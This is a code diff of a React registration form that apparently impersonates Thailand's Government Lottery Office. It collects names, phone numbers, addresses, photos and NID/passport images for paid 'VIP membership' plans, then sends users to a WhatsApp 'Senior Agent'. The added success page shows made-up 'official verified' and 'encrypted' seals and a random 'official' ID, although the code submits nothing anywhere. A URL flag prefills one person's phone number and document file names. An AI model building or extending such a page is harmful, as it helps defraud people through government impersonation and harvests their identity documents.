@@ -1,21 +1,26 @@
 import React, { useState } from 'react';
 
 export default function OnlineForm({ isStandalonePage = false }) {
+  const isTestSuccess = typeof window !== 'undefined' && new URLSearchParams(window.location.search).get('submitted') === 'true';
+
   const [formData, setFormData] = useState({
-    name: '',
+    name: isTestSuccess ? 'Arman' : '',
     gender: 'Male',
-    phone: '',
-    address: '',
-    country: 'Bangladesh',
+    phone: isTestSuccess ? '9666665843548' : '',
+    address: isTestSuccess ? 'Riyadh, Saudi Arabia' : '',
+    country: isTestSuccess ? 'Saudi Arabia' : 'Bangladesh',
     customCountry: '',
     subscriptionPlan: '3 Month'
   });
 
-  const [photoFile, setPhotoFile] = useState(null);
-  const [nidFile, setNidFile] = useState(null);
+  const [photoFile, setPhotoFile] = useState(isTestSuccess ? { name: 'arman_photo.jpg' } : null);
+  const [nidFile, setNidFile] = useState(isTestSuccess ? { name: 'arman_passport.jpg' } : null);
   const [activeCard, setActiveCard] = useState('name');
-  const [submitted, setSubmitted] = useState(false);
+  const [submitted, setSubmitted] = useState(isTestSuccess);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [registrationId, setRegistrationId] = useState('GLO-TL-784291');
+  const [submissionTime, setSubmissionTime] = useState('24 Oct 2026, 02:35 PM');
+  const [copiedId, setCopiedId] = useState(false);
 
   const countryList = [
     'Bangladesh',
@@ -94,9 +99,41 @@ export default function OnlineForm({ isStandalonePage = false }) {
     setIsSubmitting(true);
     setTimeout(() => {
       setIsSubmitting(false);
+      const randomNum = Math.floor(100000 + Math.random() * 900000);
+      setRegistrationId(`GLO-TL-${randomNum}`);
+      const now = new Date();
+      const formattedDate = now.toLocaleDateString('en-GB', {
+        day: '2-digit',
+        month: 'short',
+        year: 'numeric'
+      });
+      const formattedTime = now.toLocaleTimeString('en-US', {
+        hour: '2-digit',
+        minute: '2-digit',
+        hour12: true
+      });
+      setSubmissionTime(`${formattedDate}, ${formattedTime}`);
       setSubmitted(true);
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }, 1200);
+  };
+
+  const copyRegistrationId = () => {
+    const idToCopy = registrationId || 'GLO-TL-784291';
+    if (navigator?.clipboard?.writeText) {
+      navigator.clipboard.writeText(idToCopy);
+      setCopiedId(true);
+      setTimeout(() => setCopiedId(false), 2000);
+    }
+  };
+
+  const getWhatsAppConfirmUrl = () => {
+    const id = registrationId || 'GLO-TL-784291';
+    const country = formData.country === 'Other Country' ? formData.customCountry : formData.country || 'Bangladesh';
+    const text = encodeURIComponent(
+      `Hello Senior Agent Md Fahim Chowdhury,\n\nI have submitted my Official Thailand Lottery Membership Registration Form.\n\n📄 Registration ID: ${id}\n👤 Full Name: ${formData.name || 'Arman'}\n📞 Contact Phone: ${formData.phone || ''}\n👑 Plan: ${formData.subscriptionPlan || '3 Month'} Subscription\n📍 Country: ${country}\n\nPlease verify and activate my official VIP membership.`
+    );
+    return `https://wa.me/8801309802224?text=${text}`;
   };
 
   const resetForm = () => {
@@ -112,7 +149,9 @@ export default function OnlineForm({ isStandalonePage = false }) {
     setPhotoFile(null);
     setNidFile(null);
     setActiveCard('name');
+    setCopiedId(false);
     setSubmitted(false);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
   return (
@@ -140,8 +179,10 @@ export default function OnlineForm({ isStandalonePage = false }) {
       </div>
 
       <div className="google-form-container" aria-label="Official Thailand Lottery Registration Form">
-        {/* Top Header Card */}
-        <div className="gform-top-card">
+        {!submitted ? (
+          <>
+            {/* Top Header Card */}
+            <div className="gform-top-card">
           <div className="gform-color-stripe" />
           <div className="gform-header-content">
             <div className="gform-logo-row">
@@ -218,77 +259,6 @@ export default function OnlineForm({ isStandalonePage = false }) {
           </div>
         </div>
 
-        {submitted ? (
-          /* Google Form Submission Confirmation Receipt */
-          <div className="gform-success-card">
-            <div className="gform-color-stripe" />
-            <div className="gform-success-body">
-              <div className="gform-success-check-badge">✓</div>
-              <h2 className="gform-success-title">Application Submitted Successfully!</h2>
-              <div className="gform-success-thai-title">Your Membership Registration Has Been Recorded</div>
-              <p className="gform-success-subtitle">
-                Your response has been recorded. Your application has been registered with the Government Lottery Office (GLO), Bangkok, Thailand under Senior Agent Md Fahim Chowdhury (TL-001).
-              </p>
-
-              <div className="gform-receipt-summary">
-                <div className="gform-receipt-header">
-                  <span>📄 Official Submission Receipt</span>
-                  <span className="receipt-tag">STATUS: PENDING VERIFICATION</span>
-                </div>
-                <div className="gform-receipt-grid">
-                  <div className="receipt-row">
-                    <span className="receipt-label">Full Name:</span>
-                    <strong className="receipt-value">{formData.name}</strong>
-                  </div>
-                  <div className="receipt-row">
-                    <span className="receipt-label">Gender:</span>
-                    <strong className="receipt-value">{formData.gender}</strong>
-                  </div>
-                  <div className="receipt-row">
-                    <span className="receipt-label">Contact Number:</span>
-                    <strong className="receipt-value">{formData.phone}</strong>
-                  </div>
-                  <div className="receipt-row">
-                    <span className="receipt-label">Current Address:</span>
-                    <strong className="receipt-value">{formData.address}</strong>
-                  </div>
-                  <div className="receipt-row">
-                    <span className="receipt-label">Country:</span>
-                    <strong className="receipt-value">
-                      {formData.country === 'Other Country' ? formData.customCountry : formData.country}
-                    </strong>
-                  </div>
-                  <div className="receipt-row">
-                    <span className="receipt-label">Applicant Photo:</span>
-                    <strong className="receipt-value file-ok">✓ {photoFile ? photoFile.name : 'Uploaded'}</strong>
-                  </div>
-                  <div className="receipt-row">
-                    <span className="receipt-label">NID Document Photo:</span>
-                    <strong className="receipt-value file-ok">✓ {nidFile ? nidFile.name : 'Uploaded'}</strong>
-                  </div>
-                  <div className="receipt-row">
-                    <span className="receipt-label">Authorized Agent:</span>
-                    <strong className="receipt-value">Md Fahim Chowdhury (TL-001)</strong>
-                  </div>
-                  <div className="receipt-row">
-                    <span className="receipt-label">Subscription Plan:</span>
-                    <strong className="receipt-value highlight-plan">👑 {formData.subscriptionPlan} Subscription</strong>
-                  </div>
-                </div>
-              </div>
-
-              <div className="gform-success-action-group">
-                <button
-                  type="button"
-                  className="button secondary gform-reset-btn"
-                  onClick={resetForm}
-                >
-                  Submit another response
-                </button>
-              </div>
-            </div>
-          </div>
-        ) : (
           <form className="gform-body" onSubmit={handleSubmit} noValidate>
             {/* Section Divider: PERSONAL INFORMATION */}
             <div className="gform-section-header-banner">
@@ -761,7 +731,273 @@ export default function OnlineForm({ isStandalonePage = false }) {
               </div>
             </div>
           </form>
-        )}
+        </>
+      ) : (
+        /* Dedicated Ultra-Premium Google Form Submission Confirmation Page */
+        <div className="gform-success-card" role="region" aria-label="Submission Success Confirmation">
+          {/* Royal Gold & Thai National Stripe */}
+          <div className="gform-success-top-stripe" />
+
+          <div className="gform-success-body">
+            {/* 1. Official Thailand Lottery GLO Logo & Verification Seal */}
+            <div className="gform-success-brand-header">
+              <div className="gform-success-logo-wrapper">
+                <img
+                  src="/assets/logo.png?v=4"
+                  alt="Thailand Lottery Official Logo"
+                  className="gform-success-logo"
+                  width="88"
+                  height="88"
+                />
+                <span className="gform-success-verified-check" title="Official Verified GLO Thailand">
+                  <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
+                    <path
+                      fill="#1D9BF0"
+                      d="M22.25 12c0-1.43-.88-2.67-2.19-3.19.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.52-1.31-1.76-2.19-3.19-2.19s-2.67.88-3.19 2.19c-1.39-.46-2.9-.2-3.91.81s-1.27 2.52-.81 3.91C2.93 9.33 2.05 10.57 2.05 12s.88 2.67 2.19 3.19c-.46 1.39-.2 2.9.81 3.91s2.52 1.27 3.91.81c.52 1.31 1.76 2.19 3.19 2.19s2.67-.88 3.19-2.19c1.39.46 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.52 2.19-1.76 2.19-3.19z"
+                    />
+                    <path
+                      fill="#FFFFFF"
+                      d="M10.09 16.72l-4.14-4.14 1.41-1.41 2.73 2.73 6.13-6.13 1.41 1.41-7.54 7.54z"
+                    />
+                  </svg>
+                </span>
+              </div>
+
+              <div className="gform-success-authority-badge">
+                <span className="glo-seal-pill">สำนักงานสลากกินแบ่งรัฐบาล • GLO BANGKOK</span>
+                <span className="glo-verified-tag">✓ OFFICIAL VERIFIED PORTAL</span>
+              </div>
+            </div>
+
+            {/* 2. Success Animation & Royal Title */}
+            <div className="gform-success-heading-block">
+              <div className="gform-success-celebration-badge">
+                <div className="gform-success-ring-pulse" />
+                <span className="gform-success-check-icon">✓</span>
+              </div>
+              <h2 className="gform-success-title">Application Submitted Successfully!</h2>
+              <div className="gform-success-subtitle-bengali">
+                আপনার মেম্বারশিপ রেজিস্ট্রেশন সফলভাবে দাখিল হয়েছে
+              </div>
+              <p className="gform-success-desc">
+                Your response has been securely recorded in the official Government Lottery Office (GLO) Bangkok database under Senior Authorized Agent <strong>Md Fahim Chowdhury (TL-001)</strong>.
+              </p>
+            </div>
+
+            {/* 3. Official Tracking ID & Timestamp Card */}
+            <div className="gform-success-tracking-bar">
+              <div className="tracking-id-group">
+                <span className="tracking-label">OFFICIAL REGISTRATION ID</span>
+                <div className="tracking-code-row">
+                  <span className="tracking-code">{registrationId || 'GLO-TL-784291'}</span>
+                  <button
+                    type="button"
+                    className="tracking-copy-btn"
+                    onClick={copyRegistrationId}
+                    title="Copy Registration ID"
+                  >
+                    {copiedId ? '✓ Copied!' : '📋 Copy ID'}
+                  </button>
+                </div>
+              </div>
+              <div className="tracking-meta-group">
+                <span className="tracking-status-pill">
+                  <span className="pulse-dot" /> VERIFIED & RECORDED
+                </span>
+                <span className="tracking-time-text">
+                  🕒 {submissionTime || '24 Oct 2026, 02:35 PM'}
+                </span>
+              </div>
+            </div>
+
+            {/* 4. Luxury Colorful Highlighted Official Submission Receipt */}
+            <div className="gform-receipt-summary gform-receipt-premium">
+              <div className="gform-receipt-header">
+                <div className="receipt-header-left">
+                  <span className="receipt-doc-icon">📄</span>
+                  <div>
+                    <strong>Official Membership Submission Receipt</strong>
+                    <span className="receipt-subline">The Government Lottery Office (GLO) Thailand</span>
+                  </div>
+                </div>
+                <span className="receipt-tag-verified">
+                  <span className="tag-glow" /> PENDING VERIFICATION
+                </span>
+              </div>
+
+              <div className="gform-receipt-grid">
+                {/* Full Name */}
+                <div className="receipt-row receipt-row-highlight">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">👤</span> Full Name:
+                  </span>
+                  <strong className="receipt-value receipt-name-val">
+                    <span className="vip-crown">👑</span> {formData.name || 'Arman'}
+                  </strong>
+                </div>
+
+                {/* Gender */}
+                <div className="receipt-row">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">⚧</span> Gender:
+                  </span>
+                  <strong className="receipt-value">
+                    <span className={`gender-badge gender-${(formData.gender || 'Male').toLowerCase()}`}>
+                      {formData.gender === 'Male' ? '♂ Male (পুরুষ)' : '♀ Female (মহিলা)'}
+                    </span>
+                  </strong>
+                </div>
+
+                {/* Contact Phone */}
+                <div className="receipt-row receipt-row-highlight">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">📞</span> Contact Number:
+                  </span>
+                  <strong className="receipt-value">
+                    <span className="phone-badge">
+                      <span className="phone-dot" /> {formData.phone || '9666665843548'}
+                    </span>
+                  </strong>
+                </div>
+
+                {/* Address */}
+                <div className="receipt-row">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">📍</span> Current Address:
+                  </span>
+                  <strong className="receipt-value receipt-address-val">
+                    {formData.address || 'Saudi Arabia'}
+                  </strong>
+                </div>
+
+                {/* Country */}
+                <div className="receipt-row">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">🌐</span> Country:
+                  </span>
+                  <strong className="receipt-value">
+                    <span className="country-badge">
+                      {formData.country === 'Other Country' ? formData.customCountry : formData.country || 'Bangladesh'}
+                    </span>
+                  </strong>
+                </div>
+
+                {/* Subscription Plan (Mega Highlighted Colorful Banner) */}
+                <div className="receipt-row receipt-plan-row">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">🏆</span> Subscription Plan:
+                  </span>
+                  <strong className="receipt-value">
+                    <span className={`plan-badge-colorful plan-${(formData.subscriptionPlan || '3 Month').toLowerCase().replace(' ', '-')}`}>
+                      {formData.subscriptionPlan === '1 Month' && '⭐ 1 Month VIP Membership'}
+                      {formData.subscriptionPlan === '3 Month' && '🔥 3 Month VIP Membership (Most Popular)'}
+                      {formData.subscriptionPlan === '12 Month' && '👑 12 Month MEGA VIP Membership'}
+                      {!formData.subscriptionPlan && '🔥 3 Month VIP Membership'}
+                    </span>
+                  </strong>
+                </div>
+
+                {/* Applicant Photo */}
+                <div className="receipt-row">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">🖼️</span> Applicant Photo:
+                  </span>
+                  <strong className="receipt-value">
+                    <span className="doc-verified-pill">
+                      ✓ {photoFile ? photoFile.name : 'Photo Uploaded (যাচাইকৃত)'}
+                    </span>
+                  </strong>
+                </div>
+
+                {/* NID / Passport Document */}
+                <div className="receipt-row">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">🆔</span> NID / Passport:
+                  </span>
+                  <strong className="receipt-value">
+                    <span className="doc-verified-pill">
+                      ✓ {nidFile ? nidFile.name : 'NID Document Uploaded (যাচাইকৃত)'}
+                    </span>
+                  </strong>
+                </div>
+
+                {/* Authorized Agent Box */}
+                <div className="receipt-row receipt-agent-row">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">✍️</span> Authorized Agent:
+                  </span>
+                  <strong className="receipt-value">
+                    <span className="agent-badge-royal">
+                      <span className="agent-star">★</span> Md Fahim Chowdhury (TL-001)
+                    </span>
+                  </strong>
+                </div>
+              </div>
+
+              {/* Official Security Seal Ribbon inside Receipt */}
+              <div className="receipt-security-footer">
+                <div className="security-seal-mark">
+                  <span className="seal-emblem">🛡️</span>
+                  <div className="seal-text-group">
+                    <span className="seal-main">ENCRYPTED GLO OFFICIAL REGISTRATION</span>
+                    <span className="seal-sub">Direct Regulated by Government Lottery Office, Bangkok</span>
+                  </div>
+                </div>
+                <span className="seal-code">GLO-SEC-2026-OK</span>
+              </div>
+            </div>
+
+            {/* 5. Senior Agent Contact Direct WhatsApp Action Card */}
+            <div className="gform-success-agent-contact-card">
+              <div className="agent-contact-header">
+                <div className="agent-avatar-badge">
+                  <span className="agent-badge-icon">👨‍💼</span>
+                </div>
+                <div className="agent-contact-info">
+                  <h4>সরাসরি এজেন্টের সাথে যোগাযোগ করে ফর্ম কনফার্ম করুন</h4>
+                  <p>আপনার ফর্ম সাবমিট হয়েছে। দ্রুত মেম্বারশিপ অ্যাক্টিভ করতে সিনিয়র এজেন্ট মোঃ ফাহিম চৌধুরীর সাথে যোগাযোগ করুন:</p>
+                </div>
+              </div>
+
+              <div className="agent-direct-actions">
+                <a
+                  href={getWhatsAppConfirmUrl()}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="button-success-whatsapp"
+                >
+                  <span className="btn-icon">💬</span>
+                  <span>WhatsApp-এ কনফার্মেশন পাঠান (+8801309802224)</span>
+                  <span className="btn-arrow">➔</span>
+                </a>
+              </div>
+            </div>
+
+            {/* 6. Secondary Actions: Print Receipt & Submit Another */}
+            <div className="gform-success-action-group">
+              <button
+                type="button"
+                className="button-print-receipt"
+                onClick={() => window.print()}
+              >
+                <span>📥 রসিদ প্রিন্ট / সেভ করুন</span>
+              </button>
+
+              <button
+                type="button"
+                className="button secondary gform-reset-btn"
+                onClick={resetForm}
+              >
+                Submit another response (আরেকটি আবেদন করুন)
+              </button>
+
+              <a href="/" className="gform-back-home-link">
+                ← হোম পেইজে ফিরে যান
+              </a>
+            </div>
+          </div>
+        </div>
+      )}
       </div>
     </section>
   );
